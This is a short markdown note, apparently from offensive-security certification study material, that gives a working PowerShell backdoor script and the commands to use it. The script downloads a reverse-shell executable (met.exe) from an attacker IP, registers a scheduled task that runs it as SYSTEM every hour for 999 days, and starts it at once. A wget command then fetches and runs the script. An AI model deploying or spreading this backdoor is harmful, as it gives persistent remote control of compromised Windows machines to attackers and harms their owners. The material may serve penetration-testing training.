## backdoor.ps1
Host backdoor.ps1 file in /var/www/html/
```
$Url          = "http://192.168.x.x/met.exe"          # ← your IP/port
$OutputPath   = "C:\Windows\Tasks\met.exe"                
$TaskName     = "backdoor"
$TaskCommand  = $OutputPath

Write-Host "[*] Starting download..." -ForegroundColor Cyan

try {
    # Step 1: Download the executable
    Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing -ErrorAction Stop
    Write-Host "[+] Downloaded to $OutputPath" -ForegroundColor Green

    # Step 2: Create scheduled task (SYSTEM, hourly, long but safe duration)
    $action = New-ScheduledTaskAction -Execute $TaskCommand

    # Fixed trigger: repeat every 1 hour for 999 days (safe max)
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) `
                                        -RepetitionInterval (New-TimeSpan -Hours 1) `
                                        -RepetitionDuration (New-TimeSpan -Days 999)

    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
                                            -LogonType ServiceAccount `
                                            -RunLevel Highest

    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries `
                                             -DontStopIfGoingOnBatteries `
                                             -ExecutionTimeLimit (New-TimeSpan -Days 999)

    Register-ScheduledTask -TaskName $TaskName `
                           -Action $action `
                           -Trigger $trigger `
                           -Principal $principal `
                           -Settings $settings `
                           -Force -ErrorAction Stop | Out-Null

    Write-Host "[+] Scheduled task '$TaskName' created (hourly, SYSTEM, 999 days)" -ForegroundColor Green

    # Step 3: Run it immediately
    Start-ScheduledTask -TaskName $TaskName -ErrorAction Stop
    Write-Host "[+] Task '$TaskName' started" -ForegroundColor Green
    Write-Host "You should now receive a connection" -ForegroundColor Yellow
}
catch {
    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}
```

## Action:
All you need to do is the below command. This will download the compiled reverse shell, schedule a task hourly and run it immediatly. You will obtain a shell every hour for persistence.
```
wget http://<Kali machine>/backdoor.ps1 -O backdoor.ps1
.\backdoor.ps1
```
![Backdoor](https://raw.githubusercontent.com/cuongnguyen-git/osep/refs/heads/main/runner/backdoor.png)
